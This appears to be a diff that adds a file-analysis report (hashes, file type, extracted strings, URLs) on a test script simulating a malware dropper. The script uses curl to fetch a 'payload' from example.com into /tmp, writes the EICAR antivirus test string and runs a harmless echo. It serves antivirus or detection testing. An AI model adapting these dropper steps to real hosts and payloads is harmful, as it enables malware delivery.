@@ -1,0 +1,21 @@
+==== HASHES ====
+487a8eaccdc2691a93db15212e35a97d6fc22815084e96ca31d326b5fbfc74d3  /host/test_eicar_droper.sh
+ec4a645f1220f2bfa845aed69fd979c1  /host/test_eicar_droper.sh
+
+==== FILE TYPE ====
+/host/test_eicar_droper.sh: Bourne-Again shell script, ASCII text executable
+
+==== STRINGS (HEAD) ====
+#!/bin/bash
+echo "[*] Simulating malware dropper"
+# Simulate payload download
+echo "[*] Downloading payload (simulated)"
+curl http://example.com -o /tmp/payload.bin
+# EICAR test string (AV trigger)
+echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar_test.txt
+# Execute something suspicious-looking
+bash -c "echo running payload"
+echo "[*] Done"
+
+==== URLs / IPs ====
+http://example.com
